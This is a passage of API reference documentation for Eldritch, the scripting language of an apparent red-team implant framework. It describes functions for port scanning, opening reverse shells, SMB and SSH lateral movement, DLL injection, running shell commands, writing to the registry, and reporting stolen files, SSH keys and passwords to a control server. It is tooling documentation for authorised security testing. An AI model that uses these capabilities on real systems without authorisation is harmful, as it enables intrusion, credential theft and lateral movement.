The <b>pivot.port_scan</b> method allows users to scan TCP/UDP ports within the eldritch language.
Inputs:

- \`target_cidrs\` must be in a CIDR format eg. \`127.0.0.1/32\`. Domains and single IPs \`example.com\` / \`127.0.0.1\` cannot be passed.
- \`ports\` can be a list of any number of integers between 1 and 65535.
- \`protocol\` must be: \`tcp\` or \`udp\`. These are the only supported options.
- \`timeout\` is the number of seconds a scan will wait without a response before it's marked as \`timeout\`

Results will be in the format:

\`\`\`json
[
    { "ip": "127.0.0.1", "port": 22, "protocol": "tcp", "status": "open"},
    { "ip": "127.0.0.1", "port": 21, "protocol": "tcp", "status": "closed"},
    { "ip": "127.0.0.1", "port": 80, "protocol": "tcp", "status": "timeout"},
]
\`\`\`

A ports status can be open, closed, or timeout:

|**State**|**Protocol**| **Meaning**                                          |
|---------|------------|------------------------------------------------------|
| open    | tcp        | Connection successful.                               |
| close   | tcp        | Connection refused.                                  |
| timeout | tcp        | Connection dropped or didn't respond.                |
| open    | udp        | Connection returned some data.                       |
| timeout | udp        | Connection was refused, dropped, or didn't respond.  |

Each IP in the specified CIDR will be returned regardless of if it returns any open ports.
Be mindful of this when scanning large CIDRs as it may create large return objects.

NOTE: Windows scans against \`localhost\`/\`127.0.0.1\` can behave unexpectedly or even treat the action as malicious. Eg. scanning ports 1-65535 against windows localhost may cause the stack to overflow or process to hang indefinitely.

### pivot.reverse_shell_pty

\`pivot.reverse_shell_pty(cmd: Optional<str>) -> None\`

The **pivot.reverse_shell_pty** method spawns the provided command in a cross-platform PTY and opens a reverse shell over the agent's current transport (e.g. gRPC). If no command is provided, Windows will use \`cmd.exe\`. On other platforms, \`/bin/bash\` is used as a default, but if it does not exist then \`/bin/sh\` is used.

### pivot.smb_exec

\`pivot.smb_exec(target: str, port: int, username: str, password: str, hash: str, command: str) -> str\`

The <b>pivot.smb_exec</b> method is being proposed to allow users a way to move between hosts running smb.

### pivot.ssh_copy

\`pivot.ssh_copy(target: str, port: int, src: str, dst: str, username: str, password: Optional<str>, key: Optional<str>, key_password: Optional<str>, timeout: Optional<int>) -> str\`

The <b>pivot.ssh_copy</b> method copies a local file to a remote system.
ssh_copy will return \`"Sucess"\` if successful and \`"Failed to run handle_ssh_copy: ..."\` on failure.
If the connection is successful but the copy writes a file error will be returned.
ssh_copy will overwrite the remote file if it exists.
The file directory the \`dst\` file exists in must exist in order for ssh_copy to work.

### pivot.ssh_exec

\`pivot.ssh_exec(target: str, port: int, command: str, username: str, password: Optional<str>, key: Optional<str>, key_password: Optional<str>, timeout: Optional<int>) -> List<Dict>\`

The <b>pivot.ssh_exec</b> method executes a command string on the remote host using the default shell.
Stdout returns the string result from the command output.
Stderr will return any errors from the SSH connection but not the command being executed.
Status will be equal to the code returned by the command being run and -1 in the event that the ssh connection raises an error.

\`\`\`json
{
    "stdout": "uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner),143(docker)\\n",
    "stderr":"",
    "status": 0
}
\`\`\`

---

## Process

### process.info

\`process.info(pid: Optional<int>) -> Dict\`

The <b>process.info</b> method returns all information on a given process ID. Default is the current process.

\`\`\`json
{
  "pid": 1286574,
  "name": "golem",
  "cmd": [
    "./target/debug/golem",
    "-i"
  ],
  "exe": "/home/user/realm/implants/target/debug/golem",
  "environ": {
    "USER": "user",
    "HOME": "/home/user",
    "PATH": "/home/user/.cargo/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/snap/bin:/home/user/.dotnet/tools",
    "SHELL": "/bin/zsh",
    "TERM": "xterm-256color",
    "SSH_TTY": "/dev/pts/0",
    "SHLVL": "1",
    "PWD": "/home/user",
    "OLDPWD": "/home/user",
    "XDG_DATA_DIRS": "/usr/local/share:/usr/share:/var/lib/snapd/desktop",
    "P9K_TTY": "old",
    "_P9K_TTY": "/dev/pts/0",
    "ZSH": "/home/user/.oh-my-zsh",
  },
  "cwd": "/home/user/realm/implants",
  "root": "/",
  "memory_usage": 32317440,
  "virtual_memory_usage": 1712074752,
  "ppid": 1180405,
  "status": "Sleeping",
  "start_time": 1698106833,
  "run_time": 2,
  "uid": 1000,
  "euid": 1000,
  "gid": 1000,
  "egid": 1000,
  "sid": 1180405
}
\`\`\`

### process.kill

\`process.kill(pid: int) -> None\`

The <b>process.kill</b> method will kill a process using the KILL signal given its process id.

### process.list

\`process.list() -> List<Dict>\`

The <b>process.list</b> method returns a list of dictionaries that describe each process. The dictionaries follow the schema:

\`\`\`json
{
    "pid": "9812",
    "ppid": "1",
    "status": "Sleeping",
    "name": "golem",
    "path": "/usr/bin/golem",
    "username": "root",
    "command": "/usr/bin/golem -i",
    "cwd": "/root/",
    "environ": "CARGO_PKG_REPOSITORY= CARGO_PKG_RUST_VERSION= CARGO_PKG_VERSION=0.1.0 CARGO_PKG_VERSION_MAJOR=0",
}
\`\`\`

### process.name

\`process.name(pid: int) -> str\`

The <b>process.name</b> method returns the name of the process from it's given process id.

### process.netstat

\`process.netstat() -> List<Dict>\`

The <b>process.netstat</b> method returns all information on TCP, UDP, and Unix sockets on the system. Will also return PID and Process Name of attached process, if one exists.

_Currently only shows LISTENING TCP connections_

\`\`\`json
[
    {
        "socket_type": "TCP",
        "local_address": "127.0.0.1",
        "local_port": 46341,
        "pid": 2359037
    },
    ...
]
\`\`\`

---

## Random

The random library is designed to enable generation of cryptogrphically secure random vaules. None of these functions will be blocking.

### random.bool

\`random.bool() -> bool\`

The <b>random.bool</b> method returns a randomly sourced boolean value.

### random.int

\`random.int(min: i32, max: i32) -> i32\`

The <b>random.int</b> method returns randomly generated integer value between a specified range. The range is inclusive on the minimum and exclusive on the maximum.

### random.string

\`random.string(length: uint, charset: Optional<str>) -> str\`
The <b>random.string</b> method returns a randomly generated string of the specified length. If \`charset\` is not provided defaults to [Alphanumeric](https://docs.rs/rand_distr/latest/rand_distr/struct.Alphanumeric.html). Warning, the string is stored entirely in memory so exceptionally large files (multiple megabytes) can lead to performance issues.

---

## Regex

The regex library is designed to enable basic regex operations on strings. Be aware as the underlying implementation is written
in Rust we rely on the Rust Regex Syntax as talked about [here](https://rust-lang-nursery.github.io/rust-cookbook/text/regex.html). Further, we only support a single capture group currently, defining more/less than one will cause the tome to error.

### regex.match_all

\`regex.match_all(haystack: str, pattern: str) -> List<str>\`

The <b>regex.match_all</b> method returns a list of capture group strings that matched the given pattern within the given haystack. Please consult the [Rust Regex Docs](https://rust-lang-nursery.github.io/rust-cookbook/text/regex.html) for more information on pattern matching.

### regex.match

\`regex.match(haystack: str, pattern: str) -> str\`

The <b>regex.match</b> method returns the first capture group string that matched the given pattern within the given
haystack. Please consult the [Rust Regex Docs](https://rust-lang-nursery.github.io/rust-cookbook/text/regex.html) for more information on pattern matching.

### regex.replace_all

\`regex.replace_all(haystack: str, pattern: str, value: string) -> str\`

The <b>regex.replace_all</b> method returns the given haystack with all the capture group strings that matched the given pattern replaced with the given value. Please consult the [Rust Regex Docs](https://rust-lang-nursery.github.io/rust-cookbook/text/regex.html) for more information on pattern matching.

### regex.replace

\`regex.replace(haystack: str, pattern: str, value: string) -> str\`

The <b>regex.replace</b> method returns the given haystack with the first capture group string that matched the given pattern replaced with the given value. Please consult the [Rust Regex Docs](https://rust-lang-nursery.github.io/rust-cookbook/text/regex.html) for more information on pattern matching.

---

## Report

The report library is designed to enable reporting structured data to Tavern. It's API is still in the active development phase, so **future versions of Eldritch may break tomes that rely on this API**.

### report.file

\`report.file(path: str) -> None\`

Reports a file from the host that an Eldritch Tome is being evaluated on (e.g. a compromised system) to Tavern. It has a 1GB size limit, and will report the file in 1MB chunks. This process happens asynchronously, so after \`report.file()\` returns **there are no guarantees about when this file will be reported**. This means that if you delete the file immediately after reporting it, it may not be reported at all (race condition).

### report.process_list

\`report.process_list(list: List<Dict>) -> None\`

Reports a snapshot of the currently running processes on the host system. This should only be called with the entire process list (e.g. from calling \`process.list()\`), as it will replace Tavern's current list of processes for the host with this new snapshot.

### report.ssh_key

\`report.ssh_key(username: str, key: str) -> None\`

Reports a captured SSH Key credential to Tavern. It will automatically be associated with the host that the Eldritch Tome was being evaluated on.

### report.user_password

\`report.user_password(username: str, password: str) -> None\`

Reports a captured username & password combination to Tavern. It will automatically be associated with the host that the Eldritch Tome was being evaluated on.

---

## Sys

### sys.dll_inject

\`sys.dll_inject(dll_path: str, pid: int) -> None\`

The <b>sys.dll_inject</b> method will attempt to inject a dll on disk into a remote process by using the \`CreateRemoteThread\` function call.

### sys.dll_reflect

\`sys.dll_reflect(dll_bytes: List<int>, pid: int, function_name: str) -> None\`

The <b>sys.dll_reflect</b> method will attempt to inject a dll from memory into a remote process by using the loader defined in \`realm/bin/reflective_loader\`.

The ints in dll_bytes will be cast down from int u32 ---> u8 in rust.
If your dll_bytes array contains a value greater than u8::MAX it will cause the function to fail. If you're doing any decryption in starlark make sure to be careful of the u8::MAX bound for each byte.

### sys.exec

\`sys.exec(path: str, args: List<str>, disown: Optional<bool>, env_vars: Option<Dict<str, str>>) -> Dict\`

The <b>sys.exec</b> method executes a program specified with \`path\` and passes the \`args\` list.
On *nix systems disown will run the process in the background disowned from the agent. This is done through double forking.
On Windows systems disown will run the process with detached stdin and stdout such that it won't block the tomes execution.
The \`env_vars\` will be a map of environment variables to be added to the process of the execution.

\`\`\`python
sys.exec("/bin/bash",["-c", "whoami"])
{
    "stdout":"root\\n",
    "stderr":"",
    "status":0,
}
sys.exec("/bin/bash",["-c", "ls /nofile"])
{
    "stdout":"",
    "stderr":"ls: cannot access '/nofile': No such file or directory\\n",
    "status":2,
}
\`\`\`

### sys.get_env

\`sys.get_env() -> Dict\`

The <b>sys.get_env</b> method returns a dictionary that describes the current process's environment variables.
An example is below:

\`\`\`json
{
    "FOO": "BAR",
    "CWD": "/"
}
\`\`\`

### sys.get_ip

\`sys.get_ip() -> List<Dict>\`

The <b>sys.get_ip</b> method returns a list of network interfaces as a dictionary. An example is available below:

\`\`\`json
[
  {
    "name": "lo0",
    "ip": "127.0.0.1"
  },
  {
    "name": "lo0",
    "ip": "::1"
  },
  {
    "name": "en0",
    "ip": "fd5f:a709:7357:f34d:c8f:9bc8:ba40:db15"
  },
  {
    "name": "en0",
    "ip": "10.0.124.42"
  }
]
\`\`\`

### sys.get_os

\`sys.get_os() -> Dict\`

The <b>sys.get_os</b> method returns a dictionary that describes the current systems OS.
An example is below:

\`\`\`json
{
    "arch": "x86_64",
    "desktop_env": "Unknown: Unknown",
    "distro": "Debian GNU/Linux 10 (buster)",
    "platform": "PLATFORM_LINUX"
}
\`\`\`

### sys.get_pid

\`sys.get_pid() -> int\`

The <b>sys.get_pid</b> method returns the process ID of the current process.
An example is below:

\`\`\`python
\$> sys.get_pid()
123456
\`\`\`

### sys.get_reg

\`sys.get_reg(reghive: str, regpath: str) -> Dict\`

The <b>sys.get_reg</b> method returns the registry values at the requested registry path.
An example is below:

\`\`\`python
\$> sys.get_reg("HKEY_LOCAL_MACHINE","SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion")
{
    "ProgramFilesDir": "C:\\\\Program Files",
    "CommonFilesDir": "C:\\\\Program Files\\\\Common Files",
    "ProgramFilesDir (x86)": "C:\\\\Program Files (x86)",
    "CommonFilesDir (x86)": "C:\\\\Program Files (x86)\\\\Common Files",
    "CommonW6432Dir": "C:\\\\Program Files\\\\Common Files",
    "DevicePath": "%SystemRoot%\\\\inf",
    "MediaPathUnexpanded": "%SystemRoot%\\\\Media",
    "ProgramFilesPath": "%ProgramFiles%",
    "ProgramW6432Dir": "C:\\\\Program Files",
    "SM_ConfigureProgramsName": "Set Program Access and Defaults",
    "SM_GamesName": "Games"
}
\`\`\`

### sys.get_user

\`sys.get_user() -> Dict\`

The <b>sys.get_user</b> method returns a dictionary that describes the current process's running user.
On *Nix, will return UID, EUID, GID, EGID, and detailed user info for the UID and EUID mappings.
For users, will return name and groups of user.

\`\`\`json
{
    "uid": {
        "uid": 0,
        "name": "root",
        "gid": 0,
        "groups": ["root"]
    },
    "euid": {
        "uid": 0,
        "name": "root",
        "gid": 0,
        "groups": ["root"]
    },
    "gid": 0,
    "egid": 0
}
\`\`\`

### sys.hostname

\`sys.hostname() -> String\`

The <b>sys.hostname</b> method returns a String containing the host's hostname.

### sys.is_bsd

\`sys.is_bsd() -> bool\`

The <b>sys.is_bsd</b> method returns \`True\` if on a \`freebsd\`, \`netbsd\`, or \`openbsd\` system and \`False\` on everything else.

### sys.is_linux

\`sys.is_linux() -> bool\`

The <b>sys.is_linux</b> method returns \`True\` if on a linux system and \`False\` on everything else.

### sys.is_macos

\`sys.is_macos() -> bool\`

The <b>sys.is_macos</b> method returns \`True\` if on a mac os system and \`False\` on everything else.

### sys.is_windows

\`sys.is_windows() -> bool\`

The <b>sys.is_windows</b> method returns \`True\` if on a windows system and \`False\` on everything else.

### sys.shell

\`sys.shell(cmd: str) -> Dict\`

The <b>sys.shell</b> Given a string run it in a native interpreter. On MacOS, Linux, and *nix/bsd systems this is \`/bin/bash -c <your command>\`. On Windows this is \`cmd /C <your command>\`. Stdout, stderr, and the status code will be returned to you as a dictionary with keys: \`stdout\`, \`stderr\`, \`status\`. For example:

\`\`\`python
sys.shell("whoami")
{
    "stdout":"root\\n",
    "stderr":"",
    "status":0,
}
sys.shell("ls /nofile")
{
    "stdout":"",
    "stderr":"ls: cannot access '/nofile': No such file or directory\\n",
    "status":2,
}
\`\`\`

### sys.write_reg_hex

\`sys.write_reg_hex(reghive: str, regpath: str, regname: str, regtype: str, regvalue: str) -> Bool\`

The <b>sys.write_reg_hex</b> method returns \`True\` if registry values are written to the requested registry path and accepts a hexstring as the value argument.
An example is below:

\`\`\`python
\$> sys.write_reg_hex("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_SZ","deadbeef")
True
\$> sys.write_reg_hex("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_BINARY","deadbeef")
True
\$> sys.write_reg_hex("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_NONE","deadbeef")
True
\$> sys.write_reg_hex("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_EXPAND_SZ","deadbeef")
True
\$> sys.write_reg_hex("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_DWORD","deadbeef")
True
\$> sys.write_reg_hex("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_DWORD_BIG_ENDIAN","deadbeef")
True
\$> sys.write_reg_hex("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_LINK","deadbeef")
True
\$> sys.write_reg_hex("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_MULTI_SZ","dead,beef")
True
\$> sys.write_reg_hex("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_RESOURCE_LIST","deadbeef")
True
\$> sys.write_reg_hex("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_FULL_RESOURCE_DESCRIPTOR","deadbeef")
True
\$> sys.write_reg_hex("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_RESOURCE_REQUIREMENTS_LIST","deadbeef")
True
\$> sys.write_reg_hex("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_QWORD","deadbeefdeadbeef")
True
\`\`\`

### sys.write_reg_int

\`sys.write_reg_int(reghive: str, regpath: str, regname: str, regtype: str, regvalue: int) -> Bool\`

The <b>sys.write_reg_int</b> method returns \`True\` if registry values are written to the requested registry path and accepts an integer as the value argument.
An example is below:

\`\`\`python
\$> sys.write_reg_int("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_SZ",12345678)
True
\$> sys.write_reg_int("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_BINARY",12345678)
True
\$> sys.write_reg_int("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_NONE",12345678)
True
\$> sys.write_reg_int("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_EXPAND_SZ",12345678)
True
\$> sys.write_reg_int("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_DWORD",12345678)
True
\$> sys.write_reg_int("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_DWORD_BIG_ENDIAN",12345678)
True
\$> sys.write_reg_int("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_LINK",12345678)
True
\$> sys.write_reg_int("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_MULTI_SZ",12345678)
True
\$> sys.write_reg_int("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_RESOURCE_LIST",12345678)
True
\$> sys.write_reg_int("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_FULL_RESOURCE_DESCRIPTOR",12345678)
True
\$> sys.write_reg_int("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_RESOURCE_REQUIREMENTS_LIST",12345678)
True
\$> sys.write_reg_int("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_QWORD",12345678)
True
\`\`\`

### sys.write_reg_str

\`sys.write_reg_str(reghive: str, regpath: str, regname: str, regtype: str, regvalue: str) -> Bool\`

The <b>sys.write_reg_str</b> method returns \`True\` if registry values are written to the requested registry path and accepts a string as the value argument.
An example is below:

\`\`\`python
\$> sys.write_reg_str("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_SZ","BAR1")
True
\$> sys.write_reg_str("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_BINARY","DEADBEEF")
True
\$> sys.write_reg_str("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_NONE","DEADBEEF")
True
\$> sys.write_reg_str("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_EXPAND_SZ","BAR2")
True
\$> sys.write_reg_str("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_DWORD","12345678")
True
\$> sys.write_reg_str("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_DWORD_BIG_ENDIAN","12345678")
True
\$> sys.write_reg_str("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_LINK","A PLAIN STRING")
True
\$> sys.write_reg_str("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_MULTI_SZ","BAR1,BAR2,BAR3")
True
\$> sys.write_reg_str("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_RESOURCE_LIST","DEADBEEF")
True
\$> sys.write_reg_str("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_FULL_RESOURCE_DESCRIPTOR","DEADBEEF")
True
\$> sys.write_reg_str("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_RESOURCE_REQUIREMENTS_LIST","DEADBEEF")
True
\$> sys.write_reg_str("HKEY_CURRENT_USER","SOFTWARE\\\\TEST1","FOO1","REG_QWORD","1234567812345678")
True
\`\`\`

## Time

### time.format_to_epoch

\`time.format_to_epoch(input: str, format: str) -> int\`

The <b>time.format_to_epoch</b> method returns the seconds since epoch for the given UTC timestamp of the provided format. Input must include date and time components.

Some common formatting methods are:

- "%Y-%m-%d %H:%M:%S" (24 Hour Time)
- "%Y-%m-%d %I:%M:%S %P" (AM/PM)

For reference on all available format specifiers, see <https://docs.rs/chrono/latest/chrono/format/strftime/index.html>

### time.format_to_readable

\`time.format_to_readable(input: int, format: str) -> str\`

The <b>time.format_to_readable</b> method returns the timestamp in the provided format of the provided UTC timestamp.

Some common formatting methods are:

- "%Y-%m-%d %H:%M:%S" (24 Hour Time)
- "%Y-%m-%d %I:%M:%S %P" (AM/PM)

For reference on all available format specifiers, see <https://docs.rs/chrono/latest/chrono/format/strftime/index.html>

### time.now

\`time.now() -> int\`

The <b>time.now</b> method returns the time since UNIX EPOCH (Jan 01 1970). This uses the local system time.

### time.sleep

\`time.sleep(secs: float)\`

The <b>time.sleep</b> method sleeps the task for the given number of seconds.
`;
